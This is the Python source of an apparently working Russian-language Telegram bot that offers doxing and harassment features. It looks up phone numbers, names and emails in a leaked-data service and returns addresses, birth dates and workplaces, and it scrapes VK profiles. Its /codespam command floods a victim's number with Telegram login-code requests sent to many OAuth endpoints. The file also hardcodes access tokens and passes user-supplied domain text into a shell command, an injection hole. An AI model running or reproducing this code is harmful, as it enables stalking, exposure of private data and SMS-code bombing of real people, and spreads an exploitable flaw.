try:
    import subprocess
    import sys
    import os
    import keyboard
    from keyboard import *
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone, parse, is_valid_number
    import time
    import urllib.request
    import json
    import requests
    import colored 
    from termcolor import colored
    import subprocess
    import time
    from time import sleep
    import pyfiglet
    import fake_useragent
    from twoip import TwoIP
    import socket
    import sqlite3
    import random
    import telebot
    import requests
except:
    print('Пожалуйста запустите: pip3 install -r requirements.txt')
    sys.exit()
    
r = requests

is_spamming = False

twoip = TwoIP(key = None)

token = '7420701986:AAEdWKUZoU3VrhGo-ng2RDCAfnCb3iWa1A0'

VK_ACCESS_TOKEN = '0af157510af157510af15751aa0a89e69600af10af157516a0bc15996e74fe2b440998c'

bot = telebot.TeleBot(token)

print("Бот запустился")

# Список различных User-Agent для мобильных устройств
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
]

# Заголовки, которые можно передавать
headers = {
    "User-Agent": random.choice(user_agents),  # Случайный User-Agent
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "TE": "Trailers"
}

# Прокси для использования через Tor
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050',
}

# Сессионный объект для хранения cookies
session = requests.Session()

def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase, k=5)) + '_response.txt'

def send_reques(request_text):
    url = 'https://leakosintapi.com/'
    data = {
        "token": "924205761:OdiZCEDR",  # Замените на ваш токен
        "request": request_text,
        "limit": 1000,
        "lang": "ru"
    }

    try:
        response = requests.post(url, json=data)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return f"Ошибка: {e}"

# Функция для форматирования ответа
def format_response(response):
    formatted_response = ""
    
    if 'List' in response:
        for db_name, db_info in response['List'].items():
            formatted_response += f"\nБаза данных: {db_name}\n"
            for entry in db_info['Data']:
                formatted_response += "\n"
                for key, value in entry.items():
                    if key == 'FullName':
                        formatted_response += f"├ФИО: {value}\n"
                    elif key == 'Address':
                        formatted_response += f"├Адрес: {value}\n"
                    elif key == 'BDay':
                        formatted_response += f"├Дата рождения: {value}\n"
                    elif key == 'ContactPerson':
                        formatted_response += f"├Контактное лицо: {value}\n"
                    elif key == 'LastName':
                        formatted_response += f"├Фамилия: {value}\n"
                    elif key == 'FirstName':
                        formatted_response += f"├Имя: {value}\n"
                    elif key == 'MiddleName':
                        formatted_response += f"├Отчество: {value}\n"
                    elif key == 'Region':
                        formatted_response += f"├Регион: {value}\n"
                    elif key == 'Url':
                        formatted_response += f"├Ссылка: {value}\n"
                    elif key == 'Date':
                        formatted_response += f"├Дата: {value}\n"
                    elif key == 'JobTitle':
                        formatted_response += f"├Должность: {value}\n"
                    elif key == 'PlaceWork':
                        formatted_response += f"├Место работы: {value}\n"
                    elif key == 'Type':
                        formatted_response += f"├Тип: {value}\n"
                    elif key == 'RegDate':
                        formatted_response += f"├Дата регистрации: {value}\n"
                    elif key == 'Work':
                        formatted_response += f"├Работа: {value}\n"
                    elif key == 'IssuedBy':
                        formatted_response += f"├Выдано: {value}\n"
                    elif key == 'Description':
                        formatted_response += f"├Описание: {value}\n"
                    elif key == 'Gender':
                        formatted_response += f"├Пол: {value}\n"
                    elif key == 'VkID':
                        formatted_response += f"├VK ID: {value}\n"
                    elif key == 'Followers':
                        formatted_response += f"├Подписчики: {value}\n"
                    elif key == 'City':
                        formatted_response += f"└Город: {value}\n"
                
                formatted_response += "\n"  # Добавляем пустую строку для разделения записей

    return formatted_response if formatted_response else "Нет данных"
    
    
# Подключение к SQLite базе данных
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()

# Создание таблицы, если её нет
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id INTEGER UNIQUE,
    phone_number TEXT
)
""")
conn.commit()

# Функция для проверки, зарегистрирован ли пользователь
def is_registered(telegram_id):
    cursor.execute("SELECT 1 FROM users WHERE telegram_id = ?", (telegram_id,))
    return cursor.fetchone() is not None

def send_request(url, phone):
    try:
        # Отправляем запрос через Tor-прокси
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        
        # Пауза между запросами для имитации поведения человека
        time.sleep(random.uniform(2, 5))
        
        # Проверка статуса ответа
        if response.status_code == 200:
            print(f"Запрос выполнен успешно: {phone}")
            return response.json()  # Возвращаем данные в формате JSON
        else:
            print(f"Ошибка: {response.status_code}")
            return None
    except Exception as e:
        print(f"Ошибка при отправке запроса: {e}")
        return None

# Функция обработки номера
def phoneinfo(phone):
    try:
        parsed_phone = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed_phone):
            return "[!] Произошла ошибка -> Недействительный номер телефона"

        # Отправляем запрос на сервер
        hoh = str(parsed_phone)
        
        respone = send_reques(hoh)
    
        # Форматируем ответ
        formatted_response = format_response(respone)

        # Пример вызова функции
        url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}" # 
        data = send_request(url, phone)
        # Используем правильный модуль для получения оператора
        carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
        country_prefix = phonenumbers.region_code_for_number(parsed_phone)
        country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
        region = phonenumbers.geocoder.description_for_number(parsed_phone, "ru")
        formatted_number = phonenumbers.format_number(parsed_phone,
        phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        is_valid = "Valid" if phonenumbers.is_valid_number(parsed_phone) else "Invalid"
        is_possible = phonenumbers.is_possible_number(parsed_phone)
        timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
        national_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.NATIONAL)
        country_code = phonenumbers.region_code_for_number(parsed_phone)
        # Получаем информацию из внешнего API
        
        if not isinstance(data, dict):
            return "[!] Произошла ошибка: данные ответа не являются словарем."

        country = data.get('country', {})
        region = data.get('region', {})
        capital = data.get('capital', {})

        # Проверяем, что вложенные данные также являются словарями
        if not isinstance(country, dict):
            country = {}
        if not isinstance(region, dict):
            region = {}
        if not isinstance(capital, dict):
            capital = {}

        if data.get("status_error"):
            return f"Ошибка: {data.get('error_message', 'Не удалось получить данные обратитесь к владельцу.')}"
        
        if data.get("limit") <= 0:
            return f"Ошибка: {data.get('error_message', f'У ВАС ИСЧЕРПАН ЛИМИТ {data.get("limit")}')}"

        country_data = data.get('country', {})
        region_data = data.get('region', {})
        capital_data = data.get('capital', {})
        
        country_name = country.get('name', 'Не найдено')
        country_fullname = country.get('fullname', 'Не найдено')
        city_name = capital.get('name', 'Не найдено')
        postal_code = capital.get('post', 'Не найдено')
        currency_code = country.get('iso', 'Не найдено')
        phone_codes = capital.get('telcod', 'Не найдено')
        wiki_url = capital.get('wiki', 'Не найдено')
        car_plate_code = region.get('autocod', 'Не найдено')
        operator = capital.get('oper', 'Не найдено')
        operator_brand = capital.get('oper_brand', 'Не найдено')
        operator_default = capital.get('def', 'Не найдено')
        location = country.get('location', 'Не найдено')
        language = country.get('lang', 'Не найдено').title()
        language_code = capital.get('langcod', 'Не найдено')
        capitall = capital.get('name', 'Не найдено')
        latitude = capital.get('latitude', 'Не найдено')
        longitude = capital.get('longitude', 'Не найдено')
    
            
        htmlweb =  f"""
Ответ с HtmlWeb:
☠️[+] ├Номер телефона -> {formatted_number}
🌍[+] ├Страна: {country_name}, {country_fullname}
☃️[+] ├Город: {city_name}
🌧️[+] ├Почтовый индекс: {postal_code}
⚡[+] ├Код валюты: {currency_code}
🌀[+] ├Телефонные коды: {phone_codes}
🌪️[+] ├Посмотреть в wiki: {wiki_url}
🌈[+] ├Гос. номер региона авто: {car_plate_code}
🌊[+] ├Оператор: {carrier_info}, {operator_brand}, {operator_default}
☔[+] ├Местоположение: {country_name}, {capital.get('name', 'Не найдено')}, {city_name} ({region_data.get('okrug', 'Не найдено')})
🌝[+] ├Открыть на карте (Google): https://www.google.com/maps/place/{latitude}+{longitude}
🧭[+] ├Локация: {location}
⚓[+] ├Язык общения: {language}, {language_code}
🚨[+] ├Край/Округ/Область: {region.get('name', 'Не найдено')}, {region.get('okrug', 'Не найдено')}
🚧[+] ├Столица: {capitall}
⛽[+] ├Широта/Долгота: {latitude}, {longitude}
🚗[+] └Оценка номера в сети: https://phoneradar.ru/phone/{phone}
"""
        
        print_phone_info = f"""
Результат с phonenumbers:
🐱[*] ├Номер телефона - {formatted_number}
👑[*] ├Страна -> {country}
🖖[*] ├Регион -> {region}
🧓[*] ├Оператор -> {carrier_info}
🌵[*] ├Активен -> {is_possible}
🐉[*] ├Валид -> {is_valid}
🍥[*] ├Префикс страны -> +{country_prefix}
🍯[*] ├Таймзона -> {timezona}
🌁[*] ├Национальный формат -> {national_number}
🎂[*] ├Код страны -> {country_code}
⚽[*] ├Telegram -> https://t.me/{phone}
📱[*] ├Whatsapp -> https://wa.me/{phone}
💸[*] └Viber -> https://viber.click/{phone}"""

        osint = f"""
Ответ с Osint:
{formatted_response}
"""
        return htmlweb + "\n" + print_phone_info + "\n" + osint
    except Exception as e:
        return f"[!] Произошла ошибка -> {e}"


@bot.message_handler(commands=['stopspam'])
def stop_spamming(message):
    global is_spamming
    if is_spamming:
        is_spamming = False
        bot.send_message(message.chat.id, "Спам остановлен.")
    else:
        bot.send_message(message.chat.id, "Спам не был запущен.")


@bot.message_handler(commands=['vk'])
def vk_lookup(message):
    try:
        user_idd = message.text.split()
        if len(user_idd) < 2:
            return
    
        parts = message.text.split()
        user_id = parts[1]  # Получаем запрос из сообщения
        url = f"https://api.vk.com/method/users.get?access_token={VK_ACCESS_TOKEN}&v=5.131&user_ids={user_id}&fields=photo_id,city,country,home_town,photo_max_orig,online,contacts,site,universities,schools,status,last_seen,followers_count"
        response = requests.get(url)
        data = response.json()

        if 'error' in data:
            bot.reply_to(message, 'Неправильный VK ID.')
        else:
            user = data['response'][0]
            text = (
                f"<b>ID: {user_id}</b>\n"
                f"<b>Профиль: vk.com/{user_id}</b>\n"
                f"<b>Имя: {user.get('first_name', 'Не найдено')}</b>\n"
                f"<b>Фамилия: {user.get('last_name', 'Не найдено')}</b>\n"
                f"<b>Статус: {user.get('status', 'Не найдено')}</b>\n"
                f"<b>Страна: {user.get('country', {}).get('title', 'Не найдено')}</b>\n"
                f"<b>Город: {user.get('city', {}).get('title', 'Не найдено')}</b>\n"
                f"<b>Родной город: {user.get('home_town', 'Не найдено')}</b>\n"
                f"<b>Фото: {user.get('photo_max_orig', 'Не найдено')}</b>\n"
                f"<b>Онлайн: {'Да' if user.get('online') == 1 else 'Нет'}</b>\n"
                f"<b>Контакты: {user.get('contacts', 'Не найдено')}</b>\n"
                f"<b>Сайт: {user.get('site', 'Не найдено')}</b>\n"
                f"<b>Университеты: {', '.join([uni.get('name', 'Не указано') for uni in user.get('universities', [])]) if user.get('universities') else 'Не указаны'}</b>\n"
                f"<b>Школы: {', '.join([school.get('name', 'Не указано') for school in user.get('schools', [])]) if user.get('schools') else 'Не указаны'}</b>\n"
                f"<b>Последний раз в сети: {user.get('last_seen', {}).get('time', 'Не найдено')}</b>\n"
                f"<b>Подписчики: {user.get('followers_count', 'Не найдено')}</b>\n"
            )

        # Если ответ слишком большой, сохраняем в файл и отправляем его
        if len(text) > 4096:  # Лимит для текста в Telegram
            file_name = generate_random_filename()
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write(text)
            
            # Отправляем файл
            with open(file_name, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="Ответ слишком большой, отправлен файл.")

            # Удаляем файл после отправки
            os.remove(file_name)
        else:
            bot.send_photo(
                chat_id=message.chat.id,
                photo=user.get('photo_max_orig', ''),
                caption=text,
                parse_mode="HTML"
            )
    except Exception as e:
        bot.reply_to(message, f"Ошибка, проверьте VK ID.  {str(e)}")

def codespam(number):
    count = 0
    global is_spamming
    
    try:
        is_spamming = True
        for _ in range(5):  # 5 циклов
            if not is_spamming:  # Проверка, если спам остановлен
                return "Спам остановлен."

            user = fake_useragent.UserAgent().random
            headers = {'user-agent': user}
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
            requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', headers = headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', headers = headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin', headers = headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            
            count += 1
            # Один цикл = 10 кодов
        is_spamming = False
        print(f"Код спам на: {number}")
        return f"Коды отправлены :)"
    except Exception as e:
        is_spamming = False
        return f"[!] Ошибка! :', {e}"

def get_ip_info(ip_address):
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip_address}") as response:
            data = json.loads(response.read().decode('utf-8'))
        return data
    except urllib.error.URLError as e:
        print(f"{RED}{BOLD}Ошибка при запросе к API: {e}")
        return None

def print_ip_info(ip_info):
    if not ip_info:
        return "Информация об IP-адресе не найдена."
    return f"""Информация об IP-адресе:
IP-адрес: {ip_info.get('query', 'N/A')}
Страна: {ip_info.get('country', 'N/A')}
Город: {ip_info.get('city', 'N/A')}
Регион: {ip_info.get('regionName', 'N/A')}
Почтовый индекс: {ip_info.get('zip', 'N/A')}
Широта: {ip_info.get('lat', 'N/A')}
Долгота: {ip_info.get('lon', 'N/A')}
Часовой пояс: {ip_info.get('timezone', 'N/A')}
Провайдер: {ip_info.get('isp', 'N/A')}
Организация: {ip_info.get('org', 'N/A')}
AS: {ip_info.get('as', 'N/A')}"""


def is_valid_ip(ip_address):
    try:
        socket.inet_aton(ip_address)
        return True
    except socket.error:
        return False


# Обработчик получения контакта
@bot.message_handler(content_types=["contact"])
def contact_handler(message):
    if message.contact is not None and message.contact.user_id == message.from_user.id:
        # Сохраняем контакт в базу данных
        try:
            cursor.execute(
                "INSERT INTO users (telegram_id, phone_number) VALUES (?, ?)",
                (message.from_user.id, message.contact.phone_number)
            )
            conn.commit()
            bot.send_message(
                message.chat.id,
                "Ваш контакт сохранен. Теперь вы можете пользоваться ботом!",
                reply_markup=telebot.types.ReplyKeyboardRemove()  # Убираем клавиатуру
            )
        except sqlite3.IntegrityError:
            bot.send_message(
                message.chat.id,
                "Вы уже зарегистрированы.",
                reply_markup=telebot.types.ReplyKeyboardRemove()
            )
    else:
        bot.send_message(message.chat.id, "Пожалуйста, отправьте именно свой контакт.")

        
# Start Bot! Greeting

@bot.message_handler(commands=['start'])
def start(message):
    if is_registered(message.from_user.id):
        bot.send_message(message.chat.id, "Вы уже зарегистрированы. Добро пожаловать!")
        reply_markup=telebot.types.ReplyKeyboardRemove()
        bot.send_message(message.chat.id, '''Привет, я помогу тебе узнать провайдера и местоположение IP-адреса или домена, а так же докс по номеру телефона
    
Список команд:

ДЛЯ ДАУНОВ ПИШИТЕ НОМЕР РЯДОМ С КОМАНДОЙ

💁├/start — Перезапуск бота
🏄├/help — Отображает список основных команд
👩‍🎨├/whois — Отображает whois-информацию для IP-адреса/домена (например, /whois 128.0.0.1);
🍁├/phone --- Отображает местонахождение и информацию по номеру.
🌧️├/codespam --- Спамит кодами в телеграмме.
🪐├/stopspam --- Перестает спамить.
🍁├/vk --- Ищет информацию по вк
⚽├/osint --- ищет любую информацию, имя, телефон, почта, и т.д
🙈└/checking - Проверка существования e-mail адреса''')

    else:
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button = telebot.types.KeyboardButton("Поделиться контактом", request_contact=True)
        markup.add(button)
        bot.send_message(message.chat.id, "Пожалуйста, поделитесь своим контактом, чтобы продолжить.", reply_markup=markup)

# Command Help!

@bot.message_handler(commands=['help'])
def help(message):
    bot.send_message(message.chat.id, '''
Список команд:

🐱├/start — Перезапуск бота
🌝├/help — Отображает список основных команд
⛽├/whois — Отображает whois-информацию для IP-адреса/домена (например, /whois 128.0.0.1);
🌪️├/phone --- Отображает местонахождение и информацию по номеру.
😒├/codespam --- Спамит кодами в телеграмме.
☠️├/stopspam --- перестает спамить.
🌵├/vk --- Ищет информацию по вк
⚽├/osint --- ищет любую информацию, имя, телефон, почта, и т.д
🤐└/checking - Проверка существования e-mail адреса''')


@bot.message_handler(commands=['codespam'])
def handle_codespam(message):

    if len(message.text) < 7:
        bot.send_message(message.chat.id, """Для того чтобы заспамить кодами ты должен прислать мне номер!""")
        return

    parts = message.text.split()
    if len(parts) < 2:
        return
    
    number = parts[1]  # Получаем запрос из сообщения
    try:
        result = codespam(number)  # Вызываем функцию и передаем номер
        bot.send_message(message.chat.id, result, disable_web_page_preview=True)
    except Exception as e:
        bot.send_message(message.chat.id, f'Произошла ошибка: {str(e)}')

@bot.message_handler(commands=['phone'])
def handle_phoneinfo(message):

    if len(message.text) < 6:
        bot.send_message(message.chat.id, """Для того чтобы узнать информацию ты должен прислать мне номер!""")
        return

    bot.send_message(message.chat.id, """Запрос выполняется ждите""")
    
    parts = message.text.split()
    if len(parts) < 2:
        return
    
    numbe = parts[1]  # Получаем запрос из сообщения
    try:
        result = phoneinfo(numbe)  # Вызываем функцию и передаем номер
        
         # Если ответ слишком большой, сохраняем в файл и отправляем его
        if len(result) > 4096:  # Лимит для текста в Telegram
            file_name = generate_random_filename()
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write(result)
            
            # Отправляем файл
            with open(file_name, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="Ответ слишком большой, отправлен файл.")

            # Удаляем файл после отправки
            os.remove(file_name)
        else:
            # Отправляем текстовое сообщение, если оно в пределах лимита
            bot.send_message(message.chat.id, result, disable_web_page_preview=True)

    except Exception as e:
        bot.send_message(message.chat.id, f'Произошла ошибка: {str(e)}')


@bot.message_handler(commands=['osint'])
def handle_phoneinfo(message):
    if len(message.text) < 6:
        bot.send_message(message.chat.id, "Для того чтобы узнать информацию ты должен отправить любую информацию!")
        return

    parts = message.text.split()
    if len(parts) < 2:
        return
    
    zapros = parts[1]  # Получаем запрос из сообщения
    try:
        respon = send_reques(zapros)
    
        # Форматируем ответ
        formatted_response = format_response(respon)
        
        print(f"Осинт запрос: {formatted_response}")

        # Если ответ слишком большой, сохраняем в файл и отправляем его
        if len(formatted_response) > 4096:  # Лимит для текста в Telegram
            file_name = generate_random_filename()
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write(formatted_response)
            
            # Отправляем файл
            with open(file_name, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="Ответ слишком большой, отправлен файл.")

            # Удаляем файл после отправки
            os.remove(file_name)
        else:
            # Отправляем текстовое сообщение, если оно в пределах лимита
            bot.send_message(message.chat.id, formatted_response, disable_web_page_preview=True)

    except Exception as e:
        bot.send_message(message.chat.id, f'Произошла ошибка: {str(e)}')
        


def default_handler(message):
    if not is_registered(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "Вы не зарегистрированы. Пожалуйста, используйте /start и поделитесь своим контактом."
        )
    else:
        bot.send_message(
            message.chat.id,
            reply_markup=telebot.types.ReplyKeyboardRemove()  # Убираем клавиатуру
        )

# Whois 

@bot.message_handler(commands=['whois'])
def whois(message):
    global site

    if len(message.text) < 7:
        bot.send_message(message.chat.id, '''Для того чтобы проверить домен или IP достаточно отправить команду новым сообщением:
Команды:
/whois google.com
''')
        return

    site = message.text.split()[1:]

    try:
        # getting ip address from site
        ipAddress = socket.gethostbyname(' '.join(site))
    except:
        bot.send_message(message.chat.id, 'Нет такого Домена! Попробуйте еще раз.')
        return whois
    
    try:
        ip_info = get_ip_info(ipAddress)  # используем ipAddress вместо user_input
        if ip_info:
            ip_details = print_ip_info(ip_info)
            bot.send_message(message.chat.id, ip_details, disable_web_page_preview=True, reply_markup=None)
        else:
            bot.send_message(message.chat.id, 'Не удалось получить информацию об IP.')
    except Exception as e:
        bot.send_message(message.chat.id, f'Произошла ошибка: {str(e)}')
        
@bot.callback_query_handler(func=lambda call: True)
def more_information(call):
    if call.data == 'more_info':
        domen = ' '.join(site)
        command = (f'whois {domen}')
        info = subprocess.check_output(command, shell=True)

        bot.send_message(call.message.chat.id, 'Отправляю....')

        time.sleep(3)


        if len(info) > 4095:
            for x in range(0, len(info), 4095):
                bot.send_message(call.message.chat.id, text=info[x:x+4095], disable_web_page_preview=True)
        else:
            bot.send_message(call.message.chat.id, info, disable_web_page_preview=True)

@bot.message_handler(commands=['checking'])
def checking(message):

    if len(message.text) < 10:
        bot.send_message(message.chat.id, '''Для того чтобы проверить E-mail адрес на существования достаточно отправить команду новым сообщением:
Команды:

/checking example@gmail.com''')
        return checking

    e = message.text.split()[1:]
    email = ' '.join(e)

    try:
        api_email = r.get(f'https://api.2ip.ua/email.txt?email={email}')
        print(f"Эмаил чек: {email}")

        if api_email.text == 'true':
            bot.send_message(message.chat.id, f'E-mail адрес {email} существует')
        else:
            bot.send_message(message.chat.id, f'E-mail адрес {email} не существует')
    except:
        bot.send_message(message.chat.id, 'Ваш лимит закончился, попробуйте позже!!!')

@bot.message_handler(content_types=['text'])
def text(message):
    bot.send_message(message.chat.id, 'Что-то пошло нет так! нажмите на /start или /help !')

bot.polling(none_stop=True)
